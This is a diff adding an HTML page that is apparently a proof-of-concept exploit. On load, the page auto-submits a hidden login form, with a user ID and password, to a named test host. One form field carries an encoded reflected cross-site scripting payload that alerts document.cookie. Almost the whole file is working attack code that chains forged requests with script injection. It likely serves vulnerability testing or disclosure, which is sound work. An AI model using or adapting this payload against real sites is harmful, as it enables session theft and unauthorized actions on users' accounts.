@@ -1,0 +1,19 @@
+<html>
+  <body>
+    <form action="https://gls-test.ito.unisys.com/Cool-SSRC/default.asp?category=SSRC&service=Home" method="POST">
+      <input type="hidden" name="USERID" value="C99001374" />
+      <input type="hidden" name="PASSWD" value="123" />
+      <input type="hidden" name="BTN1" value="Logon" />
+      <input type="hidden" name="RADSSVC" value="Logon" />
+      <input type="hidden" name="RADSFRM" value="WIN1" />
+      <input type="hidden" name="RADSACT" value="BTN1" />
+      <input type="hidden" name="RADSHIS" value="&quot;&#45;5&quot;&gt;alert&#40;document&#46;cookie&#41;&lt;&#47;script&gt;" />
+      <input type="hidden" name="RADSINT" value="0" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
